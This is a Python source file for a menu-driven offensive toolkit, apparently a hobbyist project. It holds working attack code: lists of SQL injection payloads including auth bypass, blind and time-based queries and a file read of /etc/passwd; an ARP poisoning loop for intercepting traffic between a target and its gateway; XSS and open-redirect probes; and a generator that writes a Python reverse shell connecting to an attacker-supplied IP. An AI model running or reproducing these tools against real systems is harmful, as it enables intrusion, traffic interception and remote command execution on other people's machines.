import socket
import threading
import requests
from queue import Queue
from datetime import datetime
import scapy.all as scapy
import optparse
import time
from bs4 import BeautifulSoup
import concurrent.futures
import multiprocessing
def banner():
    ban = '''
 /$$      /$$ /$$   /$$ /$$$$$$$   /$$$$$$  /$$      
| $$$    /$$$| $$  | $$| $$__  $$ /$$__  $$| $$      
| $$$$  /$$$$| $$  | $$| $$  \ $$| $$  \ $$| $$      
| $$ $$/$$ $$| $$$$$$$$| $$$$$$$/| $$$$$$$$| $$      
| $$  $$$| $$|_____  $$| $$__  $$| $$__  $$| $$      
| $$\  $ | $$      | $$| $$  \ $$| $$  | $$| $$      
| $$ \/  | $$      | $$| $$  | $$| $$  | $$| $$$$$$$$
|__/     |__/      |__/|__/  |__/|__/  |__/|________/
      ~ by @YusufMaral       v1.0 
      '''

    print(ban)
def clear():
    if 'linux' in sys.platform:
        os.system('clear')
    elif 'darwin' in sys.platform:
        os.system('clear')
    else:
        os.system('cls')




def nmap():
    target = input("Enter the IP address you want to scan: ")
    port_min = int(input("Enter the start of the port range you want to scan: "))
    port_max = int(input("Enter the end of the port range you want to scan: "))
    return target, port_min, port_max

def find_database_names(url):
    payloads = [
        "' UNION SELECT schema_name, NULL FROM information_schema.schemata-- ",
        "\" UNION SELECT schema_name, NULL FROM information_schema.schemata-- ",
        "' OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata-- ",
        "\" OR 1=1 UNION SELECT schema_name, NULL FROM information_schema.schemata-- ",
	"?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'",
	"' OR '1'='1","' union select 1,name,passwd,4,5 from users-- -","union select 1,name, passwd,4,5 from users",
	"?id=1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)",
	"?id=1 and substring(version(),1,1)=5",
	"?id=1 and right(left(version(),1),1)=5",
	"?id=1 and left(version(),1)=4",
	"?id=1 and ascii(lower(substr(Version(),1,1)))=51",
	"?id=1 and (select mid(version(),1,1)=4)",
	"UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;",
	"?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables ='A'",
	"?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns ='A'"
	
    ]
    for payload in payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)
        if response.status_code == 200:
            print(f"Payload successful: {payload}")
            print("Response content:")
            print(response.text)
            break
        else:
            print(f"Payload failed: {payload}")

def port_scan(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port}: Open")
        sock.close()
    except Exception as e:
        print(f"Port {port}: Scan error ({e})")

def threader(target):
    global q
    while True:
        worker = q.get()
        port_scan(target, worker)
        q.task_done()

def nmap_scan(target, port_min, port_max):
    global q
    start_time = datetime.now()
    print("-" * 50)
    print(f"Target: {target}")
    print(f"Scanned port range: {port_min}-{port_max}")
    print("Initiating a scan...")
    print("-" * 50)
    q = Queue()
    for _ in range(100):
        t = threading.Thread(target=threader, args=(target,))
        t.daemon = True
        t.start()
    for port in range(port_min, port_max + 1):
        q.put(port)
    q.join()
    end_time = datetime.now()
    total_time = end_time - start_time
    print("-" * 50)
    print(f"The scan is complete: {end_time}")
    print(f"Elapsed time: {total_time}")
    print("-" * 50)

def check_sql_injection(url):
    sql_injection_payloads = [
        "'", "''", "`", "``", ",", '"', '""', "/", "/robots.txt","//", "\\", "\\\\", ";", "' or \"", "-- or #",
        "/admin","shadow","/robots.txt","SELECT * FROM accounts WHERE username='admin' AND password='1' OR 1=1#'",
        "' OR '1", "' OR 1 -- -", '" OR "" = "', '" OR 1 = 1 -- -', "' OR '' = '", "'='", "'LIKE'", "=0--+",
        "' UNION SELECT null, version() --", " OR 1=1", "' OR 'x'='x", "' AND id IS NULL; --", 
        "''''''''''''''UNION SELECT '2", "%00", "/*…*/", "+", "||", "%", "@variable", "@@variable", "AND 1",
        "AND 0", "AND true", "AND false", "1-false", "1-true", "1*56", "-2", "1' ORDER BY 1--+", 
        "1' ORDER BY 2--+", "1' ORDER BY 3--+", "1' ORDER BY 1,2--+", "1' ORDER BY 1,2,3--+", 
        "1' GROUP BY 1,2,--+", "1' GROUP BY 1,2,3--+", "' GROUP BY columnnames having 1=1 --",
        "-1' UNION SELECT 1,2,3--+", "' UNION SELECT sum(columnname ) from tablename --", 
        "-1 UNION SELECT 1 INTO @,@,", "-1 UNION SELECT 1 INTO @,@,@", "1 AND (SELECT * FROM Users) = 1",
        "' AND MID(VERSION(),1,1) = '5';", "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
        ",(select * from (select(sleep(10)))a)", "%2c(select%20*%20from%20(select(sleep(10)))a)", 
        "';WAITFOR DELAY '0:0:30'--", "#", "/*", "-- -", ";%00", "`",
        "SELECT * FROM users where name='", "' or 1=1#", "' or 1=0", "' and 1=1",
        "/admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'", 
        "\' or '1'='1", "' OR '1'='1", "Select * from users where id='root' or '1'='1'",
        "' OR '1'='1", "' or '1'='1", " union select 1,load_file(‘/etc/passwd’),3,4,5 %23",
	"'", "\"", "&", "^", "*", " or ''-", " or '' ", " or ''&", " or ''^", " or ''*",
        "-", " ", "&", "^", "*", " or \"\"-", " or \"\" ", " or \"\"&", " or \"\"^", " or \"\"*",
        " or true--", " or true-", " or true'", ") or true--", "') or true--", "') or ('x')=('x",
        " or 1=1", " or 1=1--", " or 1=1#", " or 1=1/*",
        "admin' --", "admin' #", "admin'/*", "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*",
        "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*",
        "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*",
        "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#", "admin') or '1'='1'/*",
        "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
        "admin\" --", "admin\" #", "admin\"/*", "admin\" or \"1\"=\"1", "admin\" or \"1\"=\"1\"--", "admin\" or \"1\"=\"1\"#", "admin\" or \"1\"=\"1\"/*",
        "admin\"or 1=1 or \"\"=\"", "admin\" or 1=1", "admin\" or 1=1--", "admin\" or 1=1#", "admin\" or 1=1/*",
        "admin\") or (\"1\"=\"1", "admin\") or (\"1\"=\"1\"--", "admin\") or (\"1\"=\"1\"#", "admin\") or (\"1\"=\"1\"/*",
        "admin\") or \"1\"=\"1", "admin\") or \"1\"=\"1\"--", "admin\") or \"1\"=\"1\"#", "admin\") or \"1\"=\"1\"/*",
        "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055"
    ]
    vulnerable = False
    for payload in sql_injection_payloads:
        test_url = f"{url}{payload}"
        response = requests.get(test_url)
        if any(error in response.text.lower() for error in ["sql syntax", "mysql", "you have an error in your sql syntax", "native client", "unclosed quotation mark", "unterminated quoted string"]):
            print(f"Potential SQL Injection vulnerability found with payload: {payload}")
            vulnerable = True
    if not vulnerable:
        print("No SQL Injection vulnerabilities found.")
def check_robots_txt(url):
    robots_url = url + "/robots.txt"
    response = requests.get(robots_url)
    if response.status_code == 200:
        print("robots.txt file found:")
        print(response.text)
def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)
    if target_mac:
        arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
        scapy.send(arp_response, verbose=False)
    else:
        print(f"Unable to get MAC address for {target_ip}")

def reset_operation(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    if fooled_mac and gateway_mac:
        arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        scapy.send(arp_response, verbose=False, count=6)
    else:
        print("Failed to get MAC address for reset operation.")

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def load_payloads_from_file(file_path):
    with open(file_path, 'r') as file:
        payloads = [line.strip() for line in file.readlines() if line.strip()]
    return payloads

def check_xss(url, payload_file):
    payloads = load_payloads_from_file(payload_file)

    for payload in payloads:
        # Test GET request
        test_url = url + "?test=" + requests.utils.quote(payload)
        r = requests.get(test_url)
        if payload in r.text:
            print(f"Possible XSS vulnerability found in GET request with payload: {payload}")
        else:
            print(f"No XSS vulnerability found in GET request with payload: {payload}")

        # Test POST request
        data = {'test': payload}
        r = requests.post(url, data=data)
        if payload in r.text:
            print(f"Possible XSS vulnerability found in POST request with payload: {payload}")
        else:
            print(f"No XSS vulnerability found in POST request with payload: {payload}")


def check_open_redirect(url):
    payloads = [
        "http://evil.com",
        "https://malicious-site.com",
        "//evil.com",
        "////evil.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "http%3A%2F%2Fevil.com",
        "%2F%2Fevil.com",
        "http://evil.com/%2E%2E",
        "http://evil.com/%2E%2E%2F%2E%2E",
	"//example.com@google.com/%2f..",
	"///google.com/%2f..",
	"///example.com@google.com/%2f..",
	"////google.com/%2f..",
	"https://google.com/%2f..",
	"https://example.com@google.com/%2f..",
	"/https://google.com/%2f..",
	"/https://example.com@google.com/%2f..",
	"//google.com/%2f%2e%2e",
	"//example.com@google.com/%2f%2e%2e",
	"///google.com/%2f%2e%2e",
	"///example.com@google.com/%2f%2e%2e",
	"////google.com/%2f%2e%2e",
	"/http://example.com",
	"/http:/example.com",
	"/https:/%5cexample.com/",
	"/https://%09/example.com",
	"/https://%5cexample.com",
	"/https:///example.com/%2e%2e",
	"/https:///example.com/%2f%2e%2e",
	"/https://example.com",
	"/https://example.com/",
	"/https://example.com/%2e%2e",
	"/https://example.com/%2e%2e%2f",
	"/https://example.com/%2f%2e%2e",
	"/https://example.com/%2f..",
	"/https://example.com//",
	"/https:example.com",
	"/%09/example.com",
	"/%2f%2fexample.com",
	"/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
	"/%5cexample.com",
	"/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
	"/.example.com",
	"//%09/example.com",
	"//%5cexample.com",
	"///%09/example.com",
	"///%5cexample.com",
	"////%09/example.com",
	"////%5cexample.com",
	"/////example.com",
	"/////example.com/",
	"////\;@example.com",
	"////example.com/"
    ]

    for payload in payloads:
        test_url = f"{url}?redirect={payload}"
        r = requests.get(test_url)
        if payload in r.url:
            print(f"Possible Open Redirect vulnerability found with payload: {payload}")
        else:
            print(f"No Open Redirect vulnerability found with payload: {payload}")



def scan_website(url):
    print(f"Scanning {url} for vulnerabilities...")
    payload_file = "payloads.txt"
    check_xss(url,payload_file)
    check_open_redirect(url)
def create_reverse_shell_payload(ip, port):
    payload_code = f"""
import socket
import subprocess

def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('{ip}', {port}))
        s.send(b"Connection established\\n")
        
        while True:
            command = s.recv(1024)
            
            if command.decode('utf-8') == 'exit':
                break
            
            output = subprocess.run(command.decode('utf-8'), shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)
        
        s.close()
    except Exception as e:
        print(f"An error occurred: {{e}}")

reverse_shell()
"""
    with open("payload.py", "w") as file:
        file.write(payload_code)
    print("Payload created as payload.py")
while True:
    banner()
    print("1 - PORT scanning")
    print("2 - Does web browsing (URL: https://example.com) and does sql injection")
    print("3 - Runs ARP poisoning")
    print("4 - Blind SQL injection")
    print("5 - Reverse Shell generates payload")
    print("6 - web site vulnerability")
    r = input("Make your choice (1, 2, 3, 4 ,5 or 6) :")
    if r == "1":
        target, port_min, port_max = nmap()
        if target:
            nmap_scan(target, port_min, port_max)
    elif r == "6":
    	target_url =input("Please specify target url from the keyboard ")
    	scan_website(target_url)
    elif r == "5":
        
        ip = input("Please enter the IP address for reverse shell: ")
        port = int(input("Please enter the port number for reverse shell:"))
        create_reverse_shell_payload(ip, port)
                 
    elif r == "4":
        url = input("Enter the URL of the website you want to browse: ")
        find_database_names(url)
	
    elif r == "2":
        
        url = input("Enter the URL of the website you want to browse: ")
        print("1 - Show site content")
        print("2 - SQL Injection test for vulnerabilities")
        
        sub_choice = input("Make your choice (1 or 2): ")
        if sub_choice == "1":
            response = requests.get(url)
            if response.status_code == 200:
                print("The site was successfully accessed.")
                print("Site Content:")
                print(response.text)
            else:
                print("The site could not be accessed. Error code:", response.status_code)
        elif sub_choice == "2":
            check_sql_injection(url),check_robots_txt(url)
        else:
            print("Invalid choice.")
    
    elif r == "3":
        user_target_ip = input("Enter the target IP address:")
        user_gateway_ip = input("Enter the gateway IP address:")
        try:
            number = 0
            while True:
                arp_poisoning(user_target_ip, user_gateway_ip)
                arp_poisoning(user_gateway_ip, user_target_ip)
                number += 2
                print("\rSending packets " + str(number), end="")
                time.sleep(3)
        except KeyboardInterrupt:
            print("\nQuit & Reset")
            reset_operation(user_target_ip, user_gateway_ip)
            reset_operation(user_gateway_ip, user_target_ip)
    else:
        print("Invalid choice.")


















